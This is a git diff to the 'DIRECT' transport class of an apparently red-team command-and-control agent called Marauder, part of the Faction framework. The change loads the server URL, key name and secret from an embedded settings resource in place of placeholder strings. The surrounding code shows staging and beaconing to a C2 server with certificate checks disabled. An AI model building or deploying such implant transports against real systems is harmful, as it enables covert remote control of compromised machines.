@@ -3,18 +3,21 @@ using System.IO;
 using System.Text;
 using System.Net;
 using System.Collections.Generic;
+using System.Reflection;
 using Newtonsoft.Json;
-using Faction.Modules.Dotnet.Common;
 
 namespace Faction.Modules.Dotnet.Common
 {
   class Transport : AgentTransport
   {
+    static Stream settingsStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("DIRECT.settings.json");
+    static Dictionary<string, string> settings = JsonConvert.DeserializeObject<Dictionary<string, string>>((new StreamReader(settingsStream)).ReadToEnd());
+
     new public string Name = "DIRECT";
-    public string Url = "APIURL";
-    public string KeyName = "KEYNAME";
-    public string Secret = "SECRET";
-    
+    public string Url = settings["ApiUrl"];
+    public string KeyName = settings["ApiKeyName"];
+    public string Secret = settings["ApiSecret"];
+
     public override string Stage(string StageName, string StagingId, string Message)
     {
       // Disable Cert Check
@@ -74,8 +77,8 @@ namespace Faction.Modules.Dotnet.Common
           Console.WriteLine($"[Marauder DIRECT Transport] Got ERROR: {e.Message}");
           responseDict["Message"] = "ERROR";
         }
-      } 
-      else 
+      }
+      else
       {
         try
         {
@@ -83,7 +86,7 @@ namespace Faction.Modules.Dotnet.Common
           string response = wc.DownloadString(beaconUrl);
           responseDict = JsonConvert.DeserializeObject<Dictionary<string, string>>(response);
         }
-        catch  (Exception e)
+        catch (Exception e)
         {
           Console.WriteLine($"[Marauder DIRECT Transport] Got ERROR: {e.Message}");
           responseDict["Message"] = "ERROR";
